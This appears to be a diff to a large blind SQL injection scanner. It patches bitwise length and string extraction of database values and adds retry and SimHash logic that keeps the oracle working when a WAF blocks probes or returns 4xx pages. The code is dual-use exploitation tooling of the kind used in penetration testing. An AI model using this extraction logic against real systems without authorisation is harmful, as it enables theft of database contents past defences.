@@ -57964,6 +57964,7 @@ class Scanner:
                 _len_fn = f"LENGTH(({query}))"
 
             _val = 0
+            _none_count = 0
             for bit in range(max_bits - 1, -1, -1):
                 _mask = 1 << bit
                 if _dbms == "Oracle":
@@ -57984,6 +57985,18 @@ class Scanner:
                 else:
                     _cond = f"{_len_fn}&{_mask}={_mask}"
                 r = await _eval(_cond)
+                # BUG-LENGTH-BITWISE-RETRY: If a bit probe returns None (WAF transient
+                # block, oracle flicker), retry once before accepting None-as-False.
+                # Without retry, a single blocked high-order bit (e.g. bit 8 = mask 256)
+                # causes the length to be underestimated by that bit's value (e.g. a
+                # true length of 257 becomes 1), while a blocked low-order bit causes
+                # slight undercount. Retrying once catches transient WAF-rate-limit
+                # blocks that clear within 100ms.
+                if r is None:
+                    await asyncio.sleep(0.1)
+                    r = await _eval(_cond)
+                    if r is None:
+                        _none_count += 1
                 # BUG-V62-LENGTH-BITWISE-NONE FIX: was `if r is None: return -1`.
                 # A single failed probe (network blip, WAF transient block) aborted the
                 # entire length detection, causing _extract_string to return "" immediately.
@@ -57996,17 +58009,31 @@ class Scanner:
                 if r is True:
                     _val |= _mask
                 await asyncio.sleep(_delay * 0.5)
+            # If too many bits were unresolvable (> 40% None after retries), the oracle
+            # is too unstable to trust — return -1 so the caller falls back to max_len.
+            if _none_count > max_bits * 0.4:
+                return -1
             return _val if _val > 0 else -1  # -1 signals "unknown" (all bits zero = suspicious)
 
         def _is_garbage(text):
             """Detect garbage extraction: non-alphanumeric, repeated chars, etc."""
+            # FIX-GARBAGE-SUPPLEMENTARY-PLANE: Supplementary-plane Unicode chars (U+10000+)
+            # in extracted DB values are virtually always garbage from a coin-flip oracle.
+            # Real database identifiers (usernames, db names, version strings) use Latin,
+            # ASCII-range, or BMP characters.  Supplementary-plane ideographs and special chars
+            # (e.g. chr(0x88888) = U+88888) appear when bitwise extraction misreads a bit
+            # because the BROAD-4XX guard was previously returning None for all True signals.
+            # Even when isalnum() returns True for supplementary-plane chars (Python considers
+            # many CJK ideographs alphanumeric), they are extraction artifacts.
+            # This check must run FIRST, before the len<3 branch, to catch all string lengths.
+            if any(ord(c) > 0xFFFF for c in text):
+                return True  # supplementary-plane char = garbage bitwise extraction (any length)
             if len(text) < 3:
                 # BUG-GARBAGE-SHORT FIX: 1 and 2 char results like 'e'/'ee' ARE garbage
                 # when the expected output is a full word (e.g. 'postgres', 'root').
                 # Any result shorter than 3 chars that contains a supplementary-plane
                 # Unicode codepoint (U+10000+) is definitively garbage (coin-flip bitwise).
-                if any(ord(c) > 0xFFFF for c in text):
-                    return True  # supplementary-plane char = garbage bitwise extraction
+                # (already checked above — kept for documentation continuity)
                 # BUG-GARBAGE-BMP FIX: `return False` passed BMP-range garbage like
                 # U+D7EB (󗫵) through without checking printability. Coin-flip oracles
                 # produce random BMP chars that are NOT printable ASCII. Reject any
@@ -58728,16 +58755,32 @@ class Scanner:
                         and _bool_calibration_true_status not in _waf_4xx_statuses):
                     return None  # WAF block — ambiguous, skip this probe
                 # BROAD-4XX-AMBIGUITY-GUARD (CRITICAL): When calibration-TRUE status is 4xx
-                # AND the probe status is also 4xx, ALL body-based oracle signals are
+                # AND the probe status is also 4xx, ALL body-based oracle signals may be
                 # unreliable — the WAF block page body may closely resemble the app's 4xx
-                # error body, causing SimHash/body-hash/body-length to return True for
-                # every WAF-blocked probe (producing garbage codepoints like chr(0x88888)).
-                # The existing guard above only fires when cal_true is NOT 4xx. This guard
-                # covers the inverse case: return None immediately, before any body oracle fires.
+                # error body.  HOWEVER: when the target legitimately returns True=4xx
+                # (e.g. True=400, False=404), the broad guard silences ALL True signals —
+                # every probe returning 400 gets None, producing all-zero garbage extraction
+                # (bitwise codepoints like chr(0x88888) appear when inversion or caching
+                # inconsistently flips None→0 to 1).
+                # FIX (BROAD-4XX-SIMHASH-PRIORITY): When SimHash norms are available, run
+                # SimHash FIRST to distinguish app-True-4xx (body matches _bool_norm_true)
+                # from WAF-block-4xx (body matches WAF page, NOT _bool_norm_true).  Only
+                # fall to the broad guard when SimHash gap < 0.05 (ambiguous — WAF and app
+                # pages too similar to reliably discriminate).
                 _WAF_4XX_BROAD_EVAL = (400, 403, 406, 429, 430, 503)
                 if (_bool_true_status is not None and _s is not None
                         and _s in _WAF_4XX_BROAD_EVAL
                         and _bool_true_status in _WAF_4XX_BROAD_EVAL):
+                    if _bool_norm_true is not None and _bool_norm_false is not None:
+                        # SimHash pre-check: evaluate body similarity before suppressing signal
+                        _norm_pre_e = (ResponseNormaliser.normalise(_extract_body_safe(fp))
+                                       if _validate_response(fp, allow_empty=True) else b"")
+                        _sim_t_pre_e = SimHasher.body_similarity(_bool_norm_true, _norm_pre_e)
+                        _sim_f_pre_e = SimHasher.body_similarity(_bool_norm_false, _norm_pre_e)
+                        _sim_gap_pre_e = _sim_t_pre_e - _sim_f_pre_e
+                        if abs(_sim_gap_pre_e) >= 0.05:
+                            return _sim_gap_pre_e > 0  # SimHash reliable — True=4xx oracle resolved
+                        # SimHash gap < 0.05 — cannot distinguish True-4xx from WAF-block-4xx
                     return None
                 _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
                 _bl = len(_body)
@@ -59242,12 +59285,27 @@ class Scanner:
                     return None  # WAF block — ambiguous, skip this probe
                 # BROAD-4XX-AMBIGUITY-GUARD (CRITICAL): mirrors the _eval guard — when
                 # calibration-TRUE status is 4xx AND probe status is also 4xx, ALL
-                # body-based oracle signals (SimHash, body-hash, body-length) are
-                # unreliable. Return None immediately before any body oracle fires.
+                # body-based oracle signals may be unreliable.  HOWEVER: when the target
+                # legitimately returns True=4xx (e.g. True=400, False=404), this guard
+                # suppresses ALL True signals — every 400 probe returns None → all bits
+                # resolve as 0 → garbage extraction (chr(0x88888) codepoints in log).
+                # FIX (BROAD-4XX-SIMHASH-PRIORITY): When SimHash norms are available, run
+                # SimHash FIRST to distinguish app-True-4xx from WAF-block-4xx.  Only
+                # fall to the broad guard when SimHash gap < 0.05 (ambiguous).
                 _WAF_4XX_BROAD_WA = (400, 403, 406, 429, 430, 503)
                 if (_bool_true_status is not None and _s is not None
                         and _s in _WAF_4XX_BROAD_WA
                         and _bool_true_status in _WAF_4XX_BROAD_WA):
+                    if _bool_norm_true is not None and _bool_norm_false is not None:
+                        # SimHash pre-check: run before broad guard to rescue True=4xx oracle
+                        _norm_pre_wa = (ResponseNormaliser.normalise(_extract_body_safe(fp))
+                                        if _validate_response(fp, allow_empty=True) else b"")
+                        _sim_t_pre_wa = SimHasher.body_similarity(_bool_norm_true, _norm_pre_wa)
+                        _sim_f_pre_wa = SimHasher.body_similarity(_bool_norm_false, _norm_pre_wa)
+                        _sim_gap_pre_wa = _sim_t_pre_wa - _sim_f_pre_wa
+                        if abs(_sim_gap_pre_wa) >= 0.05:
+                            return _sim_gap_pre_wa > 0  # SimHash reliable — True=4xx resolved
+                        # SimHash gap < 0.05 — ambiguous; apply broad guard
                     return None
                 _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
                 # Body hash — only when true/false hashes genuinely differ (same guard
@@ -59719,6 +59777,28 @@ class Scanner:
                 LOG.info("[Inference] %s: all ops blocked — using bitwise length detection directly", label)
                 try:
                     _length = await _get_length_bitwise(query, max_bits=10)
+                    # FIX-BITWISE-LENGTH-STABILITY: Verify length stability with a second run
+                    # when the first result seems suspicious (> max_len or looks like a bit-flip).
+                    # Instability produces wildly different lengths across retries (257→546→68)
+                    # because transient WAF blocks cause None-as-False bit misreads on different
+                    # bits each run.  A second run that disagrees by > 20% signals oracle
+                    # instability; we cap at max_len in that case rather than trusting either.
+                    if _length > 0 and (_length > max_len or _length > 200):
+                        await asyncio.sleep(0.15)
+                        _length2 = await _get_length_bitwise(query, max_bits=10)
+                        if _length2 > 0:
+                            _ratio = abs(_length - _length2) / max(_length, _length2)
+                            if _ratio > 0.20:
+                                # Results disagree by > 20% — oracle unstable; cap to max_len
+                                LOG.warning("[Inference] %s: bitwise length unstable (%d vs %d, ratio=%.2f) — "
+                                            "capping to max_len=%d", label, _length, _length2, _ratio, max_len)
+                                _length = max_len
+                            else:
+                                # Results agree — use the smaller (conservative) estimate
+                                _length = min(_length, _length2)
+                        else:
+                            # Second run failed — oracle may be degraded; cap to max_len
+                            _length = min(_length, max_len)
                     if _length > 0:
                         LOG.info("[Inference] %s: bitwise length=%d", label, _length)
                     elif _length is None:
@@ -60756,7 +60836,12 @@ class Scanner:
                     try:
                         _r7_v = await _extract_string(
                             _r7_q, f"r7_{_r7_label}", max_len=80)
-                        if _r7_v and len(_r7_v) >= 2:
+                        # FIX-BUG7-GARBAGE-GUARD: Explicitly reject garbage results including
+                        # supplementary-plane Unicode codepoints (e.g. chr(0x88888) = U+88888)
+                        # which are artifacts of coin-flip bitwise oracle extraction before the
+                        # BROAD-4XX-AMBIGUITY-GUARD fix.  _is_garbage catches these since
+                        # any(ord(c) > 0xFFFF) now fires for all string lengths.
+                        if _r7_v and len(_r7_v) >= 2 and not _is_garbage(_r7_v):
                             _r7_results[_r7_label] = _r7_v
                             LOG.info("[Inference] BUG7  %s = %r", _r7_label, _r7_v)
                             break
@@ -108729,6 +108814,23 @@ class TechniqueCascadeEngine:
         _gap_threshold = max(0.25, getattr(self, "_dynamic_gap", 0.30))
         _details = {}
 
+        # FIX-TRUE-4XX-ORACLE-PCV: Derive the calibrated True oracle status from fp_true
+        # so downstream guards can distinguish a legitimate True=4xx oracle response from
+        # a WAF block.  fp_true is the calibration True response passed by the caller.
+        _pcv_bool_true_status = None
+        _pcv_bool_true_is_4xx = False
+        try:
+            if fp_true is not None:
+                _pcv_bool_true_status = getattr(fp_true, 'status_code', None)
+            if _pcv_bool_true_status is None:
+                # Fall back to instance-level calibration
+                _pcv_bool_true_status = getattr(self, '_bool_true_status', None)
+            if _pcv_bool_true_status is not None:
+                _pcv_bool_true_is_4xx = (_pcv_bool_true_status in {400, 403, 406, 429, 430, 503})
+        except Exception:
+            _pcv_bool_true_status = None
+            _pcv_bool_true_is_4xx = False
+
         # FIX-CHECK-E-EMPTY-DBMS (MEDIUM, all techniques, all surfaces):
         # When dbms="" (e.g. cross-category timing detections before DBMS fingerprinting
         # completes, or DP-timing oracle firing before cascade fingerprints the DBMS),
@@ -110595,21 +110697,29 @@ class TechniqueCascadeEngine:
                 if _e_canary_status >= 500:
                     _e_canary_ok = False
                 elif 400 <= _e_canary_status < 500:
-                    # BUG-CHECKE-CANARY-400 FIX: Previous code only rejected 5xx and WAF-
-                    # fingerprint-detected blocks, NOT plain 400-499 responses.
-                    # When a WAF blocks the DBMS-SQL canary probe with a plain 400 (no WAF
-                    # fingerprint markers), _e_canary_ok stayed True.  In that scenario:
-                    #   - Detection replay is also WAF-blocked → _det_sim ≈ 1.0 (blocked
-                    #     page looks like baseline WAF page)
-                    #   - DBMS-SQL canary is also WAF-blocked → _e_direct_sim ≈ 1.0 (both
-                    #     blocked pages are identical)
-                    # This produced _e_direct_sim=1.000 ≥ 0.80 (passes) BUT _det_sim < 0.75
-                    # fails because detection page ≈ baseline WAF page.  The Check E print
-                    # then shows "FAIL inconsistent or no body change (1.000)" — the 1.000
-                    # is _e_direct_sim, and the failure is _det_sim condition.
-                    # With plain 400 canary also rejected, _e_canary_ok=False → _e_pass=False
-                    # prevents Check E from producing misleading partial passes on WAF targets.
-                    _e_canary_ok = False
+                    # FIX-TRUE-4XX-ORACLE-CHECK-E: When the calibrated True oracle response IS
+                    # a 4xx status (e.g. True=400, False=404), a DBMS-SQL canary that elicits a
+                    # True oracle response will return that 4xx status legitimately — it must NOT
+                    # be treated as a WAF block.  Only reject when the 4xx status is NOT the
+                    # expected True oracle status.
+                    if _pcv_bool_true_is_4xx and _e_canary_status == _pcv_bool_true_status:
+                        pass  # legitimate True=4xx oracle response — leave _e_canary_ok = True
+                    else:
+                        # BUG-CHECKE-CANARY-400 FIX: Previous code only rejected 5xx and WAF-
+                        # fingerprint-detected blocks, NOT plain 400-499 responses.
+                        # When a WAF blocks the DBMS-SQL canary probe with a plain 400 (no WAF
+                        # fingerprint markers), _e_canary_ok stayed True.  In that scenario:
+                        #   - Detection replay is also WAF-blocked → _det_sim ≈ 1.0 (blocked
+                        #     page looks like baseline WAF page)
+                        #   - DBMS-SQL canary is also WAF-blocked → _e_direct_sim ≈ 1.0 (both
+                        #     blocked pages are identical)
+                        # This produced _e_direct_sim=1.000 ≥ 0.80 (passes) BUT _det_sim < 0.75
+                        # fails because detection page ≈ baseline WAF page.  The Check E print
+                        # then shows "FAIL inconsistent or no body change (1.000)" — the 1.000
+                        # is _e_direct_sim, and the failure is _det_sim condition.
+                        # With plain 400 canary also rejected, _e_canary_ok=False → _e_pass=False
+                        # prevents Check E from producing misleading partial passes on WAF targets.
+                        _e_canary_ok = False
                 elif _e_fp_for_status and WAFBlockDiscriminator.is_waf_block(_e_fp_for_status):
                     _e_canary_ok = False
             except Exception:
@@ -111116,7 +111226,12 @@ class TechniqueCascadeEngine:
                 and _use_exact_payload):
             _det_bypass_ok = (
                 _det_fp is not None
-                and _det_status not in {400, 403, 406, 429, 503}
+                and (
+                    _det_status not in {400, 403, 406, 429, 503}
+                    or (  # FIX-TRUE-4XX-ORACLE-DETBYPASS: True=4xx oracle — expected True status is legitimate
+                        _pcv_bool_true_is_4xx and _det_status == _pcv_bool_true_status
+                    )
+                )
                 and _det_sim < (1.0 - max(_gap_threshold, 0.25))
             )
             if _det_bypass_ok:
@@ -123454,7 +123569,28 @@ class UniversalScanOrchestrator:
                                                     # WAF block detection: 4xx from WAF is ambiguous noise
                                                     _fp_b_s = getattr(_fp_b, 'status_code', None)
                                                     if _fp_b_s is not None and _fp_b_s in (400, 403, 406, 429, 430, 503):
-                                                        return None  # WAF block — skip
+                                                        # IBO-4XX-SIMHASH-PRIORITY FIX (CRITICAL): When the detection/True
+                                                        # baseline itself is a 4xx response (True=400, False=404 oracle),
+                                                        # the blanket return-None silences ALL True signals — every probe
+                                                        # returning 400 is rejected regardless of body → garbage extraction.
+                                                        # Fix: for normal polarity, compute body similarity vs True baseline
+                                                        # FIRST.  If sim >= threshold → body matches True baseline → genuine
+                                                        # True response (True=4xx oracle), not a WAF block.  Only return None
+                                                        # when body is dissimilar from baseline (WAF page body, not app page).
+                                                        if not _inv[0]:  # Normal polarity: SQL True → sim >= threshold
+                                                            _norm_4xx_p = (ResponseNormaliser.normalise(_extract_body_safe(_fp_b))
+                                                                           if _validate_response(_fp_b, allow_empty=True) else b"")
+                                                            _sim_4xx_p = SimHasher.body_similarity(_nb, _norm_4xx_p)
+                                                            try:
+                                                                _ibo_t4 = 0.75
+                                                                _ibo_cb4 = _BOOL_CALIBRATOR_MODULE.threshold
+                                                                if _ibo_cb4 > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3:
+                                                                    _ibo_t4 = max(0.60, min(0.85, _ibo_cb4))
+                                                            except Exception:
+                                                                _ibo_t4 = 0.75
+                                                            if _sim_4xx_p >= _ibo_t4:
+                                                                return True  # True=4xx oracle: body matches True baseline
+                                                        return None  # WAF block or inverted polarity — skip
                                                     # BUG-INLINE-BOOL-WAF-200 FIX: Cloudflare returns HTTP 200 with
                                                     # a JS challenge page — status-code check above misses it. The
                                                     # SimHash then scores "challenge page vs baseline" as high
